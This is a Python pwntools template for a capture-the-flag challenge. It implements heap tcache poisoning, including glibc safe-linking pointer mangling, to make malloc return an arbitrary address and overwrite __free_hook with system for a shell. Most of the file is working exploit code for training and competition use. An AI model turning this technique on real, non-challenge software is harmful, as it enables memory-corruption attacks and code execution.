#!/usr/bin/env python3
"""CSCTF pwn template -- heap: tcache poisoning (glibc >= 2.26; safe-linking for >= 2.32).

FILL-ME
  BINARY   : challenge ELF
  LIBC     : the challenge libc (for __free_hook / system, and to know the glibc version)
  HOST,PORT: assigned remote target
  SIZE     : the chunk size you can allocate/free (must share a tcache bin)
  TARGET   : address malloc() should hand back (e.g. libc.sym.__free_hook, a GOT slot)
  GLIBC_SAFE_LINKING : True for glibc >= 2.32 (fd pointers are mangled)

Offline arithmetic (never runs the target):
  from solvers.toolkits import pwn_exploit as X
  X.request2size(40)            -> chunk size for malloc(40)
  X.tcache_index(0x30)          -> which tcache bin
  X.bin_class(0x30)             -> tcache/fastbin/smallbin classification
  X.safe_link_mangle(pos, ptr)  -> value to write into A.fd  (glibc >= 2.32)
  X.safe_link_reveal(mangled)   -> recover a leaked heap pointer

Plan (see X.TCACHE_POISON_TEMPLATE for the full write-up):
  1. alloc A, B (same SIZE); 2. free B, free A  -> tcache: A -> B
  3. overwrite A.fd = TARGET   (mangled if safe-linking)
  4. malloc, malloc            -> 2nd chunk is at TARGET
  5. write system to __free_hook, then free a chunk containing "/bin/sh"

The alloc()/free()/edit() wrappers below are the usual menu-driven I/O -- adapt to the challenge.
RUN ONLY in docker/pwn (csctf-pwn:1), ONLY against the assigned target.
"""
import sys
from pathlib import Path
from pwn import *

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "solvers" / "toolkits"))
import pwn_exploit as X

# ---- FILL-ME -------------------------------------------------------------
BINARY = "./chall"
LIBC = "./libc.so.6"
HOST, PORT = "CHALLENGE.HOST", 0
SIZE = 0x18          # malloc request size
TARGET = 0x0         # address to make malloc return
GLIBC_SAFE_LINKING = True
# --------------------------------------------------------------------------

context.binary = exe = ELF(BINARY, checksec=False)
libc = ELF(LIBC, checksec=False)


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(exe.path)


# ---- menu I/O wrappers: ADAPT these to the challenge's prompts ----
def alloc(io, idx, size, data=b""):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(size).encode())
    if data:
        io.sendafter(b"data: ", data)


def free(io, idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"index: ", str(idx).encode())


def edit(io, idx, data):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendafter(b"data: ", data)


def main():
    io = start()
    log.info("chunk size for malloc(%d) = %#x -> %s",
             SIZE, X.request2size(SIZE), X.bin_class(X.request2size(SIZE)))

    alloc(io, 0, SIZE)            # A
    alloc(io, 1, SIZE)            # B
    free(io, 1)                   # tcache: B
    free(io, 0)                   # tcache: A -> B

    # Overwrite A.fd so the bin points at TARGET.
    if GLIBC_SAFE_LINKING:
        # &A.fd is A's user data address; leak the heap first to compute it, then:
        heap_fd_addr = 0x0        # FILL-ME: address of A.fd (A's data ptr)
        fd = X.safe_link_mangle(heap_fd_addr, TARGET)
    else:
        fd = TARGET
    edit(io, 0, p64(fd))

    alloc(io, 2, SIZE)            # returns A
    alloc(io, 3, SIZE)            # returns TARGET
    # edit(io, 3, p64(libc.sym.system))   # e.g. overwrite __free_hook
    io.interactive()              # look for CSCTF{...}


if __name__ == "__main__":
    main()
